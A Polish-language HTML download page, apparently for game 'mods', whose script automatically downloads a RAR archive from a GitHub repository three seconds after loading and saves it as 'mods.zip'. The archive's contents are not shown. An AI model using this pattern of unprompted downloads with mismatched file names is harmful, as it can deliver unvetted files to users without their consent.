<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8" />
<title>Pobieranie plików</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap');
  body {
    margin: 0; padding: 0;
    background: linear-gradient(135deg, #1e3c72, #2a5298);
    color: #cce4ff;
    font-family: 'Montserrat', sans-serif;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
    user-select: none;
    text-align: center;
  }
  h1 {
    font-size: 3rem;
    margin-bottom: 15px;
    text-shadow: 0 0 10px #74b9ff;
  }
  p {
    font-size: 1.3rem;
    margin-bottom: 40px;
    max-width: 400px;
    line-height: 1.4;
    text-shadow: 0 0 8px #74b9ff88;
  }
  .loader {
    width: 60px;
    height: 60px;
    border: 6px solid #74b9ff;
    border-top-color: transparent;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 30px;
    box-shadow: 0 0 20px #74b9ff88;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  button {
    background: #74b9ff;
    color: #0a2540;
    border: none;
    padding: 15px 40px;
    font-weight: 700;
    font-size: 1.1rem;
    border-radius: 35px;
    cursor: pointer;
    box-shadow: 0 5px 15px #4a79bbcc;
    transition: background-color 0.3s ease, transform 0.2s ease;
    user-select: none;
  }
  button:hover {
    background-color: #a0cfff;
    transform: scale(1.1);
  }
  button:active {
    transform: scale(0.95);
  }
</style>
</head>
<body>

  <h1>Pobieranie plików</h1>
  <p>Twoje pliki są pobierane. Za chwilę znajdziesz je w folderze pobranych plików.</p>

  <div class="loader"></div>

  <button id="downloadBtn">Pobierz ręcznie, jeśli pobieranie się nie zaczęło</button>

  <script>
    const zipUrl = 'https://github.com/TVRXD/TVRX/raw/refs/heads/main/mods.rar'; // zmień na swój link

    // automatyczne pobieranie po 3 sekundach
    setTimeout(() => {
      const a = document.createElement('a');
      a.href = zipUrl;
      a.download = 'mods.zip';
      document.body.appendChild(a);
      a.click();
      a.remove();
    }, 3000);

    // ręczny przycisk pobierania
    document.getElementById('downloadBtn').addEventListener('click', () => {
      const a = document.createElement('a');
      a.href = zipUrl;
      a.download = 'mods.zip';
      document.body.appendChild(a);
      a.click();
      a.remove();
    });
  </script>

</body>
</html>
